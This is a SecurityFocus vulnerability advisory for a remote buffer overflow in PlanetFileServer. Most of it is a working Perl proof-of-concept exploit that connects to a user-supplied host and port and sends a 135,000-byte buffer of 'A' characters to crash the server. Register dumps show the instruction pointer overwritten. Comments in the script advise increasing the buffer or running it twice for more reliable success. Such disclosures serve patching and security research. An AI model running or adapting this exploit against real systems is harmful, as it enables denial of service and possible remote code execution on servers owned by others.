source: http://www.securityfocus.com/bid/14138/info

PlanetFileServer is prone to a remote buffer overflow vulnerability.

A successful attack may allow an attacker to cause the server to crash or execute arbitrary code. This can lead to remote unauthorized access to the affected computer in the context of the server.

PlanetFileServer Standard (BETA) is vulnerable to this issue. 

#!/usr/bin/perl

# Vulnerability: Denial Of Service - Crash
# Discovered on: June 28, 2005
# Coded by: fRoGGz - SecuBox Labs
# Severity: Normal
# ----------- // Registers // -----------
# Dynamic Library Link of "NewAce Corporation" called "mshftp.dll" is the real problem.
# varmodAddVariable() returned error code %d
# EAX 0163D940
# ECX 41414141
# EDX 784751B6
# EBX 0163FFDC
# ESP 0163D8A8
# EBP 0163D8C8
# ESI 0163D968
# EDI 00000400
# EIP 41414141
# ------------------------------------

use IO::Socket;
use strict;

if(!$ARGV[1]) {
die "Utilisation: perl -w pfsdos.pl \n";
}

my($socket) = "";
if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],PeerPort => $ARGV[1],Proto => "TCP"))
{
print "\n\nPlanetDNS Software - PlanetFileServer v2.0.1.3\r\n";
print "Denial Of Service - Crash Vulnerability\r\n";
print "---------------------------------------------\r\n";
print "Discovered & coded by fRoGGz - SecuBox Labs\r\n\n";
print "[+] Connexion sur $ARGV[0]:$ARGV[1] ...\r\n";
print "[+] Envoi du buffer malicieux.";
# On our config the value "134891" is the min for DoS, but more is better for a great successfull exploitation.
# Security Filter Option used 7 levels, so ....
# If you change levels to the max you must set the buffer size or use this PoC 2 times, it works well.
print $socket "\x41" x 135000 . "\r\n";
close($socket);
}
else
{
print "[-] Impossible de se connecter sur $ARGV[0]:$ARGV[1]\n";
}

